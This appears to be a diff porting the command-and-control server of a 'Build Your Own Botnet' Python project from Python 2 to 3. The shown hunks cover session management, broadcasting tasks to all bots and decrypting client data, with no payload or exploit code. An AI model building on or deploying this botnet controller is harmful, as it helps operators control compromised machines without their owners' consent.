@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Command & Control (Build Your Own Botnet)'
-from __future__ import print_function
+
 
 # standard library
 import os
@@ -353,12 +353,12 @@ class C2():
                 info = json.loads(info)
             except: pass
         if isinstance(info, dict):
-            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
-            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
-            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
+            max_key = int(max(list(map(len, [str(i1) for i1 in list(info.keys()) if i1 if i1 != 'None']))) + 2) if int(max(list(map(len, [str(i1) for i1 in list(info.keys()) if i1 if i1 != 'None']))) + 2) < 80 else 80
+            max_val = int(max(list(map(len, [str(i2) for i2 in list(info.values()) if i2 if i2 != 'None']))) + 2) if int(max(list(map(len, [str(i2) for i2 in list(info.values()) if i2 if i2 != 'None']))) + 2) < 80 else 80
+            key_len = {len(str(i2)): str(i2) for i2 in list(info.keys()) if i2 if i2 != 'None'}
             keys = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
-                for key in keys.values():
+                for key in list(keys.values()):
                     if info.get(key) and info.get(key) != 'None':
                         try:
                             info[key] = json.loads(key)
@@ -432,7 +432,7 @@ class C2():
 
     def _get_prompt(self, data):
         with self._lock:
-            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
+            return input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
@@ -484,20 +484,20 @@ class C2():
         globals()['post_handler'].terminate()
 
         # kill subprocesses (subprocess.Popen)
-        for proc in self.child_procs.values():
+        for proc in list(self.child_procs.values()):
             try:
                 proc.kill()
             except: pass
 
         # kill child processes (multiprocessing.Process)
-        for child_proc in self.child_procs.values():
+        for child_proc in list(self.child_procs.values()):
             try:
                 child_proc.terminate()
             except: pass
         
         # kill clients or keep alive (whichever user specifies)
         if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
-            for session in self.sessions.values():
+            for session in list(self.sessions.values()):
                 if isinstance(session, Session):
                     try:
                         session._active.set()
@@ -531,10 +531,10 @@ class C2():
                 util.display("'{cmd}' is not a valid command. Type 'help' to see all commands.".format(cmd=cmd))
                 return
         else:
-            info = {command['usage']: command['description'] for command in self.commands.values()}
+            info = {command['usage']: command['description'] for command in list(self.commands.values())}
 
-        max_key = max(map(len, list(info.keys()) + [column1])) + 2
-        max_val = max(map(len, list(info.values()) + [column2])) + 2
+        max_key = max(list(map(len, list(info.keys()) + [column1]))) + 2
+        max_val = max(list(map(len, list(info.values()) + [column2]))) + 2
         util.display('\n', end=' ')
         util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
@@ -689,10 +689,10 @@ class C2():
         """
         if globals()['debug']:
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
-        sessions = self.sessions.values()
+        sessions = list(self.sessions.values())
         send_tasks = [session.send_task({"task": command}) for session in sessions]
         recv_tasks = {session: session.recv_task() for session in sessions}
-        for session, task in recv_tasks.items():
+        for session, task in list(recv_tasks.items()):
             if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
                 session._prompt = task.get('result')
             elif task.get('result'):
@@ -776,7 +776,7 @@ class C2():
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
             print()
-            for ses in self.sessions.values():
+            for ses in list(self.sessions.values()):
                 util.display(str(ses.id), color='white', style='normal')
                 self.database._display(ses.info)
                 print()
@@ -983,7 +983,7 @@ class Session(threading.Thread):
         msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
-        for key, val in info.items():
+        for key, val in list(info.items()):
             if str(val).startswith("_b64"):
                 info[key] = base64.b64decode(str(val[6:])).decode('ascii')
         return info
